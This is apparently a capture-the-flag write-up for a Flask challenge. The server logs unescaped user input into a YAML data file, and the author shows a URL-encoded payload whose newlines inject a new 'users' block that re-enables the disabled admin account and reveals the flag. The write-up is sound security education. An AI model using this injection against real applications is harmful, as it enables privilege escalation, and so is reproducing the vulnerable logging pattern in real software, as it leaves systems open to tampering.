# No Admin For You

Server:

```python
with open("/challenge/data.yml", "w") as o:
    o.write("users:\n")
    o.write("  admin:\n")
    o.write("    disabled: true\n")
    o.write("  hacker:\n")
    o.write("    disabled: false\n")
    o.write("logs:\n")

def panic(msg):
    with open("/challenge/data.yml", "a") as o:
        o.write(f"- {msg}")
    flask.abort(400, msg)

@app.route("/", methods=["GET"])
def challenge():
    users = yaml.safe_load(open("/challenge/data.yml"))["users"]
    user = flask.request.args.get("user")

    if user not in users:
        panic(f"unknown user {user}")
    if users[user].get("disabled", False):
        panic(f"disabled user {user}")

    if user == "admin":
        return f"""
            <html><body>
            YES! Your flag: {open("/flag").read()}
            </body></html>
        """
    else:
        return f"""
            <html><body>
            NO FLAG FOR YOU, HACKER!
            </body></html>
        """
```

We need to enable admin; can inject yaml through the panic() function: `/?user=random%0Ausers%3A%0A%20%20admin%3A%0A%20%20%20%20disabled%3A%20false`

```text
random
users:
  admin:
    disabled: false
```

Result YAML:

```yaml
users:
  admin:
    disabled: true
  hacker:
    disabled: false
logs:
- unknown user random
users:
  admin:
    disabled: false
```

Go to `/?user=admin` to claim the flag!
